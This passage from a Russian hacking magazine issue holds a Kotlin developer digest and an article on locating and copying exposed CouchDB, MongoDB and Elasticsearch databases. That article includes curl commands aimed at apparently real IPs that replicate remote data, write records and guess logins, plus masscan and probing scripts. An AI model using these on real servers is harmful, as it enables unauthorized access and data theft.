   переданным ему в качестве аргумента. А в аргументе всегда передается
   строка 12345678.
 4. Рас шифро вать файлы не составит труда, но сна чала необходимо най ти,
   где они хранятся. Для этого надо прос ледить за метода ми, вызыва ющими
   метод шифрования. В итоге нашел ся такой код:


   public static final File m18904s(Context context) {
       C3655i.m20371c(context, "context");
       File externalFilesDir = context.getExternalFilesDir(
   "photo_encrypt");
       if (externalFilesDir != null) {
           return externalFilesDir;
       }
       C3655i.m20376h();
       throw null;
   }

   Это код создания объекта класса File во внешнем приват ном каталоге
   приложения (context.getExternalFilesDir):


   /sdcard/Android/data/eztools.calculator.photo.vault/files

 5. Теперь файлы можно извлечь и расшифро вать. Автор написал для этого
   скрипт на Python, приводить его здесь я не буду.


              РАЗРАБОТЧИКУ


SharedFlow, StateFlow и broadcast channels
Shared ﬂows, broadcast channels — статья Романа Елизарова (текущего главы
разработки  Kotlin) о раз витии средств ком муника ции между корутинами
и текущем положении дел в этой области.
   Статья начинается с рассказа о каналах (Channel) — средстве коммуника‐
ции потоков исполнения  (в данном случае корутин), позаимствованном
из модели параллельного программирования CSP и языка Go. Каналы поз‐
воляют удобно и легко обмениваться данными и синхронизировать сос‐
тояние нес кольких корутин без опасности столкнуться с проблемой одновре‐
менного изме нения состояния объекта.
  В дополнение к классическим каналам в библиотеке kotlinx‐coroutines так‐
же появил ся так называемый BroadcastChannel. Это специальный тип канала,
позволяющий получать отправленные в канал сообщения сра зу нескольким
корутинам (под писчикам). По сути, это была реализация пат терна event bus.
  В целом каналы были весьма неплохим решени ем, но только до тех пор,
пока раз работ чику не требовалось орга низовать высокопроиз водитель ный
конвейер обработки дан ных, когда данные передаются по каналу одной
корутине, затем подвергаются обработке и с помощью дру гого канала
передаются следующей корути не.





Каналы, в силу своей природы как механиз ма син хронизации, просто не мог‐
ли обеспечить приемлемой про изводительности в таком сценарии исполь‐
зования.
   Эту проб лему решил новый механизм передачи данных — Flow. Он поз‐
воляет создать так называемый холодный поток дан ных, который будет
порожден толь ко при подключении пот ребителя и создаст проблемы с про‐
изводительностью, только если источник и пот ребитель будут работать в раз‐
ных потоках. Основная идея Flow в том, чтобы позволить программисту «опи‐
сать» алго ритм генерации потока данных и запускать этот поток лишь тогда,
когда в нем воз никнет необходимость. К примеру, следующий код не соз дает
никаких данных до тех пор, пока на объекте coldFlow не будет вызван метод
collect:


val coldFlow = flow {
    while (isActive) {
        emit(nextEvent)
    }
}

При этом каж дый потребитель получит собственную копию данных. И в этом
же его проблема. Flow превос ходно справляется с задачей организа ции кон‐
вейеров обработки данных, но его нельзя использовать, когда поток данных
должен существовать сам по себе: например, для организации обра ботки
системных событий в том самом паттерне event bus.
  Решить эту задачу призван SharedFlow. Это своего рода производитель‐
ный ана лог BroadcastChannel, он сущес твует независимо от наличия пот‐
ребителей (которые теперь называются подписчи ками) и отдает всем под‐
писчикам одни и те же дан ные (в противовес клас сическому Flow, который
создает индивиду аль ный поток дан ных для каждого потребителя).





Создать event bus с помощью SharedFlow крайне просто:


class BroadcastEventBus {
    private val _events = MutableSharedFlow<Event>()
    val events = _events.asSharedFlow()


    suspend fun postEvent(event: Event) {
        // Корутина будет приостановлена до получения сообщения
подписчиками
        _events.emit(event)
    }
}

По умолчанию корутина‐производитель приостанавлива ет свое исполне ние
до тех пор, пока потребители не получат новое сообщение. Это поведение
можно изменить: создать буфер сообщений, который сможет породить про‐
изводитель перед тем, как его корутина будет приостановлена, или указать
размер истории сообщений, чтобы вновь подключившиеся подписчики могли
получить уже опубликованные сооб щения.
   Если же задача требует, чтобы производитель не приостанавливался
ни при каких обстоятельствах, а потребите ли получали только последнее
сообщение, то для этого есть StateFlow. Это основанная на Flow реализация
паттерна «Состояние»:


class StateModel {
    private val _state = MutableStateFlow(initial)
    val state = _state.asStateFlow()


    fun update(newValue: Value) {
        // Производитель не приостанавливается
        _state.value = newValue
    }
}

Как говорит Роман, val x: StateFlow<T> можно представить как асин хрон‐
ную вер сию var x: T с функцией подписки на обновления.
   Учитывая все сказанное выше, можно утверждать, что Flow стал полноцен‐
ной, более производитель ной и приближен ной к реаль ным задачам заменой
каналов. Однако в одном случае каналы имеют преимущества: когда сооб‐
щение дол жно быть обработано ровно один раз (не больше и не меньше).


class SingleShotEventBus {
    private val _events = Channel<Event>()
    val events = _events.receiveAsFlow()


    suspend fun postEvent(event: Event) {
        // Корутина будет приостановлена при переполнении
        _events.send(event)
    }
}

Этот пример схож с приведенным ранее BroadcastEventBus. Он также отда‐
ет сообщения во внешний мир с помощью Flow. Но есть важное отличие:
в первом случае при отсутствии подписчи ков сообщение будет выброшено,
во втором производитель будет приостановлен до тех пор, пока не появит ся
потребитель.


Kotlin и контракты
How to Make the Compiler Smarter — статья о том, как сделать компилятор
Kotlin умнее, используя контракты.
  Компилятор Kotlin (и анализатор кода в среде разработки) отличается
мощной системой выведения типов. Например, в следующем фрагменте
кода компилятор способен самостоятельно понять, что переменная s не рав‐
на null при использовании в качестве аргумента функции print:


fun printLengthOfString() {
    val s: String? = "Hey Medium!"
    if (s != null) {
        print("The length of '$s' is ${s.length}")
    }
}

Но стоит немного изменить код, и компилятор становится бессилен:


fun printLengthOfString() {
    val s: String? = "Hey Medium!"
    if (s.isNotNull()) {
        print("The length of '$s' is ${s.length}")
    }
}


fun String?.isNotNull(): Boolean {
    return this != null
}

К счастью, начиная с Kotlin 1.3 в нашем распоряжении есть механизм, поз‐
воляющий подсказать ком пилятору, как быть с теми или иными типами в раз‐
ных ситу ациях. Мы можем как бы заключить с компилятором контракт, что
если при веден ная выше функция isNotNull возвращает true, то это значит,
что строка не равна null. Компилятор будет это учи тывать при выведении
типов.
   Контракты пишутся в самом начале фун кции примерно в таком виде:


fun String?.isNotNull(): Boolean {
    contract {
        returns(true) implies(this@isNotNull != null)
    }
    return this != null
}

В данном случае контракт как раз сообщает, что если функция возвращает
true (returns(true)), то строка не равна null (implies (this@isNotNull !=
null)). Компилятор будет это учитывать, и приведенный выше при мер уже
не будет оши боч ным.
   Вторая часть кон тракта (функция implies) называ ется эффектом. Есть
также другой эффект — CallsInPlace. Он нужен для того, чтобы сооб щить
компилятору, что указанная в аргументе лямбда была выполнена один
или больше раз.
  Работает это так. Допус тим, у нас есть такой код:


var a: Int
{
    a = 42
}
print(a)

Этот код не будет ском пилирован, так как компилятор не уверен, что код внут‐
ри лямбды (a = 42) был выполнен хотя бы раз. Теперь добавим в код кон‐
тракт:


fun main() {
    var a: Int
    initialize {
        a = 42
    }
    print(a)
}


fun initialize(myLambda: () ‐> Unit) {
    contract {
        callsInPlace(myLambda, InvocationKind.AT_LEAST_ONCE)
    }
    myLambda()
}

Теперь код успешно компилируется, потому что мы заверили компилятор, что
лямбда initialize будет выпол нена хотя бы один раз.


Серверная разработка на Kotlin
Server‐Side Development with Kotlin: Frameworks and Libraries — статья раз‐
работчиков из JetBrains о сер верной разработке на язы ке Kotlin и фреймвор‐
ках, которые могут в этом помочь.
 1. Spring   Framework.  Один   из  самых   популярных  фреймворков
   для бэкенд‐разработ ки. Spring изначально можно было использовать сов‐
  местно с Kotlin, но начиная с пятой версии в фреймворке появился ряд
   расширений для более удобной разработки на этом языке. Даже примеры
   в документации Spring теперь приведе ны на двух языках. Генератор про‐
   ектов start.spring.io теперь также поддерживает Kotlin.
 2. Ktor. Фреймворк для создания асинхронных клиентских и сер верных
   веб‐при ложений, разработанный в JetBrains. Базируется на корутинах
   и обладает высокой масштабиру емостью.
 3. Exposed. Реализация SQL ORM для Kotlin.
 4. Spek, Kotes, MockK, Kotlin Power Assert. Библиотеки тес тирова ния и мокин‐
   га специаль но для Kotlin.
 5. Klaxon, kotlinx.serialization. Биб лиотеки для удобной работы с JSON.
 6. RSocket. Протокол для создания микросервисов с поддержкой Kotlin.
 7. GraphQL Kotlin. Библиотека для удобной работы с GraphQL из Kotlin.

Многие другие фреймворки, включая Micronaut, Quarkus, Javalin, Spark Java,
Vaadin, CUBA и Vert.x, также поддерживают Kotlin и имеют документацию
и при меры кода на Kotlin. Большой список Kotlin‐библиотек можно найти
здесь.


Живые шаблоны и Surround With
IntelliJ IDEA / Android Studio Tricks: Surround With — статья об очень полезной,
но далеко не всем известной функции IDEA под названием Surround With.
  В IDEA (и, как следствие, Android Studio) есть функция Live Templates
(живые шаблоны), которая пред ставляет собой нечто вроде сок ращений
для длин ных строк кода и конструк ций. Типичный пример — шаблон ifn —
if null. Ты просто пишешь ifn, затем нажимаешь Tab, и сре да разработки сама
вставляет в код конструкцию if (x == null) { }, автоматически выделяет
x и ставит на него курсор. Функция настоль ко умная, что даже попытается
предсказать имя переменной x на основании  того, какие переменные
текущей области видимости могут иметь значение null.
   У шаблонов есть родственная функция под названием Surround With. Она
работает пример но так же, но по отношению к уже имеющемуся выражению.
Например, если навес ти курсор на любую строку кода и нажать Ctrl + Alt + T,
среда раз работки покажет на экра не меню с выбором шаблонов. Среди них
есть шаб лон, который обрамит выражение в блок try/catch, в if/else и так
далее.
  И конечно же, IDEA позволяет создавать собственные шаблоны. Открой
настройки, далее Editor → Live Templates, затем кноп ка +. Полезные при меры
шаблонов:


by lazy { $SELECTION$ }


CoroutineScope(Dispatchers.Main).launch {
    $SELECTION$
}


withContext(Dispatchers.IO) {
    $SELECTION$
}


              БИБЛИОТЕКИ


 • Red Screen Of Death — заменяет стандар тное сообщение о краше при‐
   ложения на экран со стектрей сом;
 • Spotlight — библиотека для соз дания экранов обучения;
 • CodeView — встра иваемый редактор кода;
 • BlurHashExt — Kotlin‐расширения для библиотеки BlurHash;
 • LocationFetcher — библиотека для получения текущих координат с исполь‐
   зованием Kotlin Flow;
 • Android_dbinspector — биб лиотека для прос мотра содержимого базы дан‐
   ных при ложения прямо на устройстве;
 • iiVisu — визу али затор звукового спектра;
 • Brackeys‐IDE — редак тор кода с подсветкой синтаксиса;
 • ScreenshotDetector — демоприложение, которое определяет, что был сде‐
   лан скриншот приложения;
 • GraphQL Kotlin — библиотека для создания кли ентов и серверов GraphQL
   на Kotlin;
 • Exhaustive —  аннотация,  позволяющая  пометить  выражение  when
   как исчерпывающее (не имеющее других вариантов);
 • Lifecycle‐Delegates — библиотека для соз дания полей, которые будут про‐
   инициали зиро ваны в момент выполнения lifecycle‐колбэка (onCreate, on‐
   Start и так далее);
 • Bundler — библиотека для удоб ного создания бандлов (Bundle);
 • ReadTime — библиотека для получения примерного времени на чтение
   текста.
ВЗЛОМ





 Михаил Артюхин
localhostt412@mail.ru




В ПОИСКАХ
УТЕЧЕК

КАК ХАКЕРЫ ИЩУТ И УГОНЯЮТ
ЧУЖИЕ БАЗЫ ДАННЫХ




Практически каждый день «Хакер» пишет о масштаб ных и не
очень утеч ках дан ных. «Течет» откуда только можно, и пос‐
ледствия быва ют самыми раз ными. Сегод ня я постара юсь
рассказать и показать, как лег ко зло умышленники могут
получить дос туп к обширным массивам все воз можных дан‐
ных.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни автор, ни редакция
                       не несут ответс твенности за любой воз можный
                        вред, при чинен ный материалами данной статьи.
                     Неправомер ный   доступ    к   компьютерной
                     информации преследуется по закону.


Прежде чем прис тупать к атакам, пред лагаю разобраться, почему они вооб‐
ще возможны и почему жизнь по‐прежнему ничему не учит админов и прочих
причастных к защите БД.
 • Порог вхождения в применение современ ных БД, как и в IT в целом, сни‐
   жается. Начинающему эникейщику все проще попасть на администри‐
   рование сервиса, требующего тщательной и внимательной нас тройки,
   да и элементарных знаний о кон кретном продукте. К счастью таких «инже‐
   неров», но к сожалению владель цев утекших данных, многие сетевые сер‐
   висы (нап ример, базы данных) мож но развернуть «в один клик». При этом
   совершенно не требуется понимать механизм работы и возможные угрозы
   развертываемым сервисам. И хорошо, если свежеустановленная база
   данных нас траива лась хотя бы по инс трукции с первой страницы поис‐
   ковика. А если нет?
 • Частенько авторизацию отклю чают по соображениям «удобства» работы
   с данными. В ито ге наружу торчит порт, а нередко и интерфейс СУБД,
   с которым мож но делать что угодно. Приходи — бери что хочешь…
 • Начальство требует сде лать все максимально дешево, так как денег мало
   и тра тить их на достойного спеца не хочется. Вот и просят дизайнера
   Ваську накатить и настроить БД для ком пании за чашку кофе. Какая уж тут
   безопасность — хорошо, если хоть пароль поставит.

Таким обра зом, одной из основных причин утечки данных служит кривору‐
кость адми нис тра торов небезопасная кон фигурация СУБД, оставленная
в резуль тате невнимательности или же просто недостатка зна ний.


        WWW

                     Пугающие  масштабы  криворукости  админов
                      и при меры утечек из‐за это го можно увидеть
                       на канале «Утечки информации», да и в «Хакере»
                  мы о них регулярно пишем.



САМЫЕ ИНТЕРЕСНЫЕ СУБД
СУБД — это сис тема управления базами данных, которая обес печивает
механизм хранения и поиска этих самых данных. В дальнейшем я буду час то
использовать это сок ращение.

CouchDB

CouchDB — это база данных с открытым исходным
кодом,  разработан ная   прог рам мным  фондом
Apache.  Клас сическая  NoSQL‐база.  Написана
на язы ке Erlang.
   Больше всего нас интересу ют способы под клю чения:
 • порт HTTP API (по умолчанию — 5984);
 • веб‐интерфейс Futon.

Доступ к БД реализован по протоколу HTTP с использованием JSON API, что
позволяет обращаться к данным в том числе из выполняемых в браузере
веб‐при ложений. Имеет свой собственный графический веб‐интерфейс (Fu‐
ton).
  Мы же вос пользуем ся обычным curl. Вот, к примеру, зап рос приветствия:


curl http://127.0.0.1:5984/

Ответ расскажет нам о номере версии, имени поставщика и версии програм‐
много обеспечения:


{
  "couchdb":"Welcome","version":"2.3.1",
  "git_sha":"c298091a4",
  "uuid":"777dc19849f3ff0392ba09dec1a62fa7",
  "features":["pluggable‐storage‐engines","scheduler"],
  "vendor":{"name":"The Apache Software Foundation"}
}

Чтобы получить спи сок всех БД на сервере, можно выполнить такой запрос:


curl http://127.0.0.1:5984/_all_dbs

В ответ мы уви дим


[
  "_replicator",
  "_users",
  "mychannel_",
  "mychannel_kizuna‐chaincode",
  "mychannel_lscc",
  "mychannel_user"
]

Здесь _replicator и _users — это стан дартные БД.
  В ответ также мож но получить такую ошибку:


{
  "error":"unauthorized",
  "reason":"You are not a server admin."
}

Смело идем мимо, здесь ловить нечего. Уровень ано ним ного доступа нас‐
троен так, что мы не можем даже увидеть список БД на сервере, не то что
к ним под клю чить ся. Но можно попробовать наудачу подобрать пароль. Зап‐
рос на авто ризацию выглядит следующим образом:


curl ‐X PUT http://localhost:5984/test ‐u "login:password"

Чтобы подключиться к графическому интерфейсу, нет необходимости ставить
какое‐либо ПО, достаточно прос то в браузере перейти по такому адресу:


http://127.0.0.1:5984/_utils/

Чтобы унести данные, можно восполь зовать ся сле дующим запросом:


curl ‐X POST ‐d '{"source":"http://54.161.77.240:5984/
klaspadchannel_","target":"http://localhost:5984/klaspadchannel_"}'
http://localhost:5984/_replicate ‐H "Content‐Type: application/json"

Конечно же, потребуется поднять сервер CouchDB на локальной машине.
Впрочем, было бы странно, если бы его у тебя не было, раз уж ты собрался
работать с этой базой.

MongoDB

MongoDB — это кросс‐платформенная докумен‐
тоориентированная база данных,  которая обес‐
печивает высокую производительность и  легкую
масштабируемость. В основе данной БД  лежит  концепция  коллекций
и докумен тов. Способов подклю чения опять два:
 • HTTP API (порт по умолчанию — 27017);
 • клиент Robo 3T.

Получить минимальную информацию о находке можно простым GET‐зап‐
росом на порт API.


curl ‐X GET http://114.116.117.104:27017

Сведения здесь и правда скром ные, без драйвера БД не удастся добыть хоть
сколько‐нибудь полезные данные, кроме того, что БД здесь вообще при сутс‐
твует (или нет).
   Если на порте кру тит ся действитель но MongoDB, то ответ придет таким:



  It looks like you are trying to access MongoDB over HTTP on the native
  driver port.


Этого вполне достаточно, чтобы продолжить ручную провер ку при помощи
графического клиента.
   Унести данные из находки можно через GUI.

Elasticsearch

Elasticsearch —  это  представитель  кластерных
NoSQL  баз данных, имеющий JSON REST  API
и использующий Lucene для пол нотексто вого поис‐
ка. Написана на Java. Мы будем рас сматривать ее как хранилище документов
в формате JSON.
   База Elasticsearch спо собна масштабироваться до петабайт структуриро‐
ванных и неструктуриро ванных данных. Данные в индексе разделены на один
или несколь ко осколков (шардов). Благодаря разделению Elasticsearch может
масштабироваться и достигать раз меров, которые не потянула бы одна
машина. Elasticsearch — это распределенная система, описать максималь‐
ные объ емы хранения данных зат руднитель но, могу сказать только, что там
могут лежать петабайты и больше.
  Способы подключения следующие:
 • HTTP API (порт по умолчанию — 9200);
 • графический кли ент Kaizen, который можно взять на официальном сай те.

HTTP API — штука очень простая. Для начала давай запросим приветствие.
Ради безопас ности подопытного сервера часть адреса замазана:


curl ‐XGET http://47.99.Х.Х:9200/

Если все хорошо и мы правда нашли «Эластик», то в ответ придет что‐то
подобное:


{
  "name" : "node‐2",
    "cluster_name" : "es",
    "cluster_uuid" : "q10ZJxLIQf‐ZRZIC0kDkGQ",
    "version" : {
        "number" : "5.5.1",
        "build_hash" : "19c13d0",
        "build_date" : "2017‐07‐18T20:44:24.823Z",
        "build_snapshot" : false,
        "lucene_version" : "6.6.0"
    },
    "tagline" : "You Know, for Search"
}

Выведем список всех индексов в БД:


curl ‐XGET http://47.99.Х.Х:9200/_cat/indices\? v

Ответ получим при мер но такой.



  health status index         uuid                   pri rep docs.count
  docs.deleted store.size pri.store.size
  green  open   bdp‐interface x3DLdQRyTK2jssMvIJ3FmA   5   1      32576
  28    428.9mb        214.4mb
  green  open   onair‐vlog    Vsq0srUGSk2NvvYmXpxMBw   5   1         22
  0    931.9kb        465.9kb
  green  open   meizidb       PCybF4SvTdSt1BoOCYLxNw   5   1       5328
  1     27.9mb         13.9mb
  green  open   rms‐resource  R6c3U5_pQgG71huRD0OdDA   5   1     125827
  36      1.2gb        636.2mb


Узнаем наз вания полей, которые хранятся в БД:


curl ‐XGET http://47.99.X.X:9200/meizidb

Ответ:


{
  "meizidb":{
    "aliases":{},
    "mappings":{
      "assets":{
        "dynamic_templates":[{"string":{
            "match_mapping_type":"string",
            "mapping":{"type":"keyword"}
        }}],
        "properties":{
          "annexList":{
            "properties":{
              "annexFileId":{"type":"keyword"},
              "annexName":{"type":"keyword"},
              "annexSize":{"type":"long"},
              "annexThumbUrl":{"type":"keyword"},
              "annexType":{"type":"keyword"},
              "annexUrl":{"type":"keyword"}
            }
          },
          "appCode":{"type":"keyword"},
          "asrText":{"type":"text","index_options":"offsets",
"analyzer":"ik_max_word"},
          "assetsType":{"type":"keyword"},
          "cdetail":{
            "properties":{
              "SP":{"type":"keyword"},
              "jz":{"type":"keyword"},
              "src":{"type":"keyword"},
              "tag":{"type":"keyword"},
              "type":{"type":"keyword"}
            }
          },
          "companyId":{"type":"keyword"},
          "companyName": ...
}

Можно и вносить записи. Но я настоятельно не рекомендую, так как без
договора с вла дельцем сервера это может повлечь тяж кие последствия.


curl ‐X POST http://47.99.Х.Х:9200/onair‐vlog/catalogue/1 ‐H
'Content‐Type: application/json' ‐d @‐ << EOF
{
   "username" : "KassNT",
   "subject" : "My Referal url: ",
   "referal" : "https://xakep.ru/paywall/form/?init&
code=xakep‐promo‐KassNT"
}
EOF




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
   В ПОИСКАХ УТЕЧЕК
                 КАК ХАКЕРЫ ИЩУТ И УГОНЯЮТ ЧУЖИЕ
                               БАЗЫ ДАННЫХ





ПРИМЕРЫ РУЧНОГО ПОИСКА
Существуют два пути поис ка подопытных.
  Первый путь — онлайновые сервисы, которые сканируют весь мир
и предоставляют нам информацию о хостах при помощи поисковых операто‐
ров. Мож но, например, «просто найти» цель в одном из них.
 • Shodan.io
 • Fofa.so
 • Censys.io
 • Zoomeye.org
 • Binaryedge.io
 • Lampyre.io

Показывать каждый подробно я не буду, но приведу несколь ко примеров.
Например, запрос на поиск MongoDB для сервиса Fofa будет выг лядеть так.





                                    Fofa.so

Подобный ему сер вис — Zoomeye.org. Запрос на поиск хостов с поднятой
CouchDB здесь будет выглядеть так же несложно.





                           ZoomEye

Продемонстрирую результаты работы сервиса Shodan с помощью одноимен‐
ной консольной утилиты. Результат поиска по запросу [product:mongodb
all:"metrics"] будет как на скрине ниже.





                             Shodan

Вто рой путь — применить ручные сканеры.
 • Nmap
 • Masscan
 • Zmap из пакета утилит Zmap.io
 • Project Sonar
 • Что‐то свое

Сканирование, конечно, ручное, но почему бы не воспользовать ся готовым
набором данных? Нап ример, если VPS‐провай дер не поз воляет сканировать
все подряд на огромной скорости, то эти ребята уже сделали все за вас! Ну,
почти.
  О Project Sonar слышало не так много людей. Это исследовательский про‐
ект, который сканирует сервисы и протоколы, чтобы получить представление
о  глобальном воздействии распространенных  уязвимостей. Разработан
в компании, создавшей, надеюсь, небезызвестный тебе Metasploit Frame‐
work, — Rapid7. Собранные данные доступны широкой публике для иссле‐
дований в области безопасности.





                                  Project Sonar

Нам будет интересен раздел TCP Scans, где содер жатся результаты опро са
IP‐адре сов по различным портам. Подойдет, нап ример, набор данных
по резуль татам 9200‐го пор та (Elasticsearch).



  TCP Scans


  [2020‐10‐07‐1602049416‐http_get_9200.csv.gz] [39.9 MB] [October 7, 2020]


  Lines: 3 472 740


  [ 'timestamp_ts' , 'saddr' , 'sport' , 'daddr' , 'dport' , 'ipid' ,
  'ttl' ]


  '1602049426' , '146.148.230.26' , '9200' , '71.6.233.15' , '9200' ,
  '54321' , '248'
  '1602049426' , '34.102.229.177' , '9200' , '71.6.233.70' , '9200' ,
  '60681' , '122'
  '1602049426' , '104.232.64.108' , '9200' , '71.6.233.105' , '9200' ,
  '54321' , '248'
  '1602049426' , '164.116.204.58' , '9200' , '71.6.233.79' , '9200' ,
  '38329' , '242'
  '1602049426' , '35.186.233.76' , '9200' , '71.6.233.7' , '9200' ,
  '44536' , '122'
  '1602049426' , '192.43.242.72' , '9200' , '71.6.233.113' , '9200' ,
  '19234' , '56'
  '1602049426' , '166.241.202.174' , '9200' , '71.6.233.47' , '9200' ,
  '26802' , '242'
  '1602049426' , '142.92.75.134' , '9200' , '71.6.233.115' , '9200' ,
  '28081' , '243'
  '1602049426' , '198.86.33.87' , '9200' , '71.6.233.112' , '9200' ,
  '17403' , '59'


Для Masscan составим такую команду на запуск:


masscan ‐p9200,9042,5984,27017 10.0.0.0/8 ‐‐echo > result.txt





                            Masscan

Имея на руках готовый спи сок хостов, мож но приступить к детальной провер‐
ке.





                         Nmap

Здесь видно, что порт не просто открыт — на нем запущен сервис
Elasticsearch.
  В резуль тате ска нирования и поиска разными сервисами было обнаруже‐
но немало любопыт ного. На скринах — небольшая выборка.





                          CouchDB





                                      InfoRisk





                             Чаты

Неожиданно обнаружились списки имен, ников, фамилий (со ссылкой на кон‐
кретный акка унт Telegram, VK или Viber), 16 баз данных, в каж дой 15–20 тысяч
строк таких вот списков.





                         Apache Cassandra


РАЗБОР ПОЛЕТОВ
Вот что в последнее время случается с теми, кто криво настраивает доступ
к БД. Все данные отправ ляют ся на тот свет, а незадачливому админу оста‐
ется только запис ка с требова нием выкупа.





                        Требование выкупа

Можно глянуть, кто и что творил с данными, при помощи команды show log.





                           Убитая БД

Как видно, все довольно просто: зашли, стерли данные, повесили свой
README.
  Прочитав логи, легко можно увидеть, что «записка о выкупе» перезаписы‐
валась много раз. Каждый раз, ког да очередной злодейский бот находит
открытую базу, записка прос то меняется на новую.





                           Убитая БД

Бот проверяет возможность авто ризации и записи, после чего дропает все
данные, оставляя памятку скорбящему владель цу.
  Данные, конечно, никто не возвращает и даже не бэкапит перед унич‐
тожением, как красиво расписано в тексте. Здесь надеяться на честность
преступника, к сожалению, бесполезно.


АВТОМАТИЗАЦИЯ
Чтобы быстрее искать СУБД, я написал небольшой скрипт, который работает
со списками в формате [ip]:[port]. Вот что он делает:
 • открывает на чтение указанный файл;
 • считывает строку ip:port через разделитель в переменную;
 • обращается при помощи curl по HTTP к хосту из переменной;
 • считывает http_response , пришедший от хоста (время ответа хоста
   ограничено в моем случае четырьмя секундами);
 • на основе полученного кода http_response хост сохраняется либо
   в «успешные», либо в «мусорку».

Действия совер шаются цикличес ки, пока не закончится входной файл.


echo "$LINE" | cut ‐d":" ‐f'1 2';
HTTP_CODE=$(curl ‐‐write‐out "%{http_code}\n" "http://"$LINE""
‐‐output output.txt ‐‐silent   ‐‐connect‐timeout 4)
if (("$HTTP_CODE"=="200")); then
  echo
"##########################‐‐HTTP_API_FOUND‐‐
#########################"
;
  echo $LINE >> result.txt
  else
    echo "Tried to access it, but f'ed up";
    echo $LINE >> trash_bin.txt
fi

Поскольку  распростра нение  таких  скриптов  может  квалифицироваться
как создание вредонос ных программ, я привожу не совсем рабочий код.
И тебе тоже рекомендую быть бдительным, если попробуешь написать что‐то
в том же духе.





                    Пример работы скрипта

Как видишь, автоматизиро вать поиск целей и даже их даль нейшую «обработ‐
ку» крайне легко.


ВЫВОДЫ
Я, конечно, рассмот рел далеко не все варианты, выбрав наиболее час то
«текущие» СУБД. Но принцип, думаю, понятен: даже если ты админ, а не
какой‐нибудь хакер, знать возможные векторы атак обязатель но. Пери оди‐
чески сканируй свои серверы, чтобы узнавать о дырах раньше, чем их найдут
злоумышленники. Зак рывай по умолчанию все ненужные порты. Прячь эндпо‐
инты за авторизацией и генерируй надежные пароли. И конечно, делай
бэкапы на случай, если твои дан ные все же найдет и уничтожит чей‐то бот.
ВЗЛОМ

   ПОПАЛСЯ!

               ЧТО ДЕЛАТЬ, ЕСЛИ ТЕБЯ
            ПРИВЛЕКАЮТ К УГОЛОВНОЙ
                  ОТВЕТСТВЕННОСТИ
               ЗА КИБЕРПРЕСТУПЛЕНИЕ





                                                                    Максим Горшков
                                                                                       Специалист по
                                                                                 информационной
                                                                                    безопасности и форензике
                                                                                                temujin@bk.ru





Может показаться, что в циф ровом мире выходить за рамки
закона безопаснее, чем в реаль ном: про ще уничтожить сле‐
ды преступления, да и специалистов нужного про филя
в органах не так много. На самом деле это не так. Я семь лет
служил в органах пред варительного следствия (следс твен‐
ный комитет, МВД) и рас следовал мно го преступлений
в сфере информационных тех нологий. В этой статье я рас‐
скажу, чего ждать и как облегчить свою участь, если ты попал
в поле зрения правоохранитель ных органов.


Будем надеяться, ты читаешь эту статью из любопытства, а не из насущной
необходимости!


ВИДЫ ПРЕСТУПЛЕНИЙ
Преступления в сфе ре IT очень раз ношерстные. Выделю основные, с которы‐
ми приходит ся стал киваться почти каждый день.


Хищения с применением информационных технологий
К этой категории относит ся мошенничество с помощью фишинга, кража
денежных средств со счетов, в том чис ле кардинг.


Преступления в сфере незаконного оборота наркотиков
Скоро десять лет, как появился нелегальный маркет Silk Road, и с тех пор
борьба с ано нимными торговыми площад ками не ути хает по всему миру.
По‐прежнему находятся авантюристы, которые верят, что их онлайновый
магазин никто не най дет. Достаточно глянуть статистику, и ты увидишь, сколь‐
ко подобных биз несов прикрывают каждый год — это огромные цифры;
а ведь за сбыт наркотиков в РФ можно зап росто отсидеть четверть века!


Приобретение специальных средств
Этот и следующий пункт называют «народными статьями», и вот почему. Пра‐
воохранительная система любит статистику: чем больше людей прив лекают
к ответственности, тем лучше — от этого зависят премии, награды, звания
сотрудников.
  Несколько лет назад в законодательстве был баг, который позволял прив‐
лекать к ответс твен ности «гиков», покупающих мобильные телефоны, GPS‐
маячки, микрокамеры, не име ющие лицензирования на территории РФ, —
за приобре тение средств для негласного получения информации.


Интернет-экстремизм
О сроках за «мемасики» или «репосты» слышал каждый. Сей час по этой
статье не так лютуют, и все же сотни людей уже получили свои, хоть
и условные, но сроки и судимости.


Создание, распространение вредоносных программ или
неправомерный доступ к компьютерной информации
Это уже настоящая хакерская статья, и довольно редкая. Чем менее рас‐
пространен состав преступления, тем он инте рес нее для статис тики. Так что
если ты попадешь в поле зрения органов в связи с чем‐то подобным, то
и «разрабаты вать» тебя будут усерднее обычного.


Распространение детской порнографии
На этот состав нарыва ются любите ли торрентов: скачал и забыл удалить —
считай, что уже совершаешь прес тупление. Сло вил зловред и передал свой
ПК ботнету? За тобой придут.
   У нас в органах «вычисляют по IP» безо всяких шуток. Тот, кто попался
подобным образом, ско рее всего, окажется не злостным хакером, а невин‐
ным любите лем крякнутых прог рамм. Тем не менее без изъятия техники дело
не обойдется.


ИНТЕРНЕТ ОТЯГЧАЕТ
Особо отмечу, что по Уголов ному кодексу мошенничества, кражи, незакон‐
ный оборот нар котиков через интернет влекут за собой более тяжкие сан‐
кции, чем те же преступления, совершенные без использования информа‐
ционных технологий.
   Киберпреступления сложнее раскрыть, поэтому не так давно их «отяг‐
чили» — теперь эти составы тяжкие и особо тяжкие. Так что за кражу двух
тысяч руб лей из кармана сумки ты будешь сидеть на «под писке о невы езде»
в ходе предварительного следствия и отделаешься условным сроком, а если
украл две тысячи со счета банковской карты, то запросто можешь быть арес‐
тован и получишь вполне реальный срок до десяти лет.


ВРЕМЯ ПРОТИВ ТЕБЯ
Если ты перешел черту закона (по невниматель ности или намеренно), то
ни завтра, ни послезавтра за тобой, скорее всего, не придут. Даже оператив‐
ные подразделения отягощены бюрократичес кими требова ниями и не всегда
оправдывают свое название и действуют оперативно.
  К тому же во всех учебниках об оперативно‐разыскной деятель ности
рекомендуют не торопиться, а капитально закрепиться в доказательствах.
Если схватить зло умышленника слишком рано, то все тру ды могут пойти нас‐
марку: не хватит доказательной базы и его придется отпустить.
   Сотрудники правоохранительных органов далеко не всегда умнее прес‐
тупника, но они умеют ждать. Я встречал случаи, когда киберпреступников
разрабатывали больше года. Рано или поздно злоумыш ленник потеряет бди‐
тельность и совершит явную ошибку. Тут‐то ему можно вменить сразу
совокупность прес туплений. Ведь каждая кража или другое действие —
это отдельное прес тупление, и орга нам всегда выгоднее привлечь человека
за 10–20 преступлений, чем за одно.


ОТКУДА ПРАВООХРАНИТЕЛЬНЫЕ ОРГАНЫ ВООБЩЕ МОГУТ О ТЕБЕ
УЗНАТЬ?
